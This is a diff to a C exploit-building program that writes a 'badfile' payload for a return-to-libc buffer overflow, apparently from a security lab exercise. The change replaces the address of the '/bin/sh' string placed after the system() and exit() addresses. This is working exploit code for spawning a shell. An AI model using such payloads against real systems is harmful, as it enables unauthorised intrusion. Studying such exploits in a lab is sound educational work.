@@ -29,7 +29,7 @@ void main(int argc, char **argv)
 	long *tmp = (long *) buffer;
 	*(tmp + 9) = 0xb7e42da0;   //  system()
 	*(tmp + 10) = 0xb7e369d0;   //  exit()
-	*(tmp + 11) = 0xbfffffae;   //  "/bin/sh"
+	*(tmp + 11) = 0xb7f6382b;   //  "/bin/sh"
 	
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
